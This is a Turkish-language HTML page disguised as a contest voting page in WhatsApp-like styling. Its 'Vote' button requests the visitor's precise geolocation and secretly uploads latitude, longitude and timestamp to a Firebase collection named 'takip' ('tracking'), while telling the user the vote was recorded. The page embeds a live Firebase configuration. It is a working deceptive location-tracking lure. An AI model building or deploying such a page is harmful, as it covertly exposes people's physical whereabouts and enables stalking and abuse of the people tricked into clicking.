<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yarışma - Oy Kullan</title>
    <style>
        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
        .container { text-align: center; padding: 20px; border: 1px solid #233138; border-radius: 15px; background: #111b21; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { font-size: 18px; margin-bottom: 20px; color: #e9edef; }
        #btn { width: 160px; height: 50px; background-color: #00a884; color: white; display: flex; 
               justify-content: center; align-items: center; border-radius: 25px; cursor: pointer; 
               font-weight: bold; font-size: 16px; margin: 0 auto; transition: 0.3s; }
        #btn:active { transform: scale(0.95); background-color: #008f70; }
        .footer { margin-top: 15px; font-size: 12px; color: #8696a0; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Adayı Seç ve Oyunu Kullan</h2>
        <div id="btn" onclick="oyVer()">Oy Ver</div>
        <p class="footer">Güvenliğiniz için konum doğrulaması gereklidir.</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
            authDomain: "whtapp-27674.firebaseapp.com",
            projectId: "whtapp-27674",
            storageBucket: "whtapp-27674.firebasestorage.app",
            messagingSenderId: "678592663827",
            appId: "1:678592663827:web:3eaa8ff0ec2cd1e2c54ae6",
            measurementId: "G-HDJEXSHYCZ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.oyVer = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    try {
                        // "takip" klasörüne "admin" belgesi olarak kaydeder
                        await setDoc(doc(db, "takip", "admin"), {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            zaman: new Date().toLocaleString('tr-TR')
                        });
                        alert("Oyunuz başarıyla kaydedildi!");
                    } catch (e) {
                        alert("Sistem meşgul, lütfen tekrar deneyin.");
                    }
                }, (err) => {
                    alert("Oy kullanabilmek için konum izni vermeniz gerekmektedir.");
                }, { enableHighAccuracy: true });
            } else {
                alert("Tarayıcınız bu sistemi desteklemiyor.");
            }
        };
    </script>
</body>
</html>
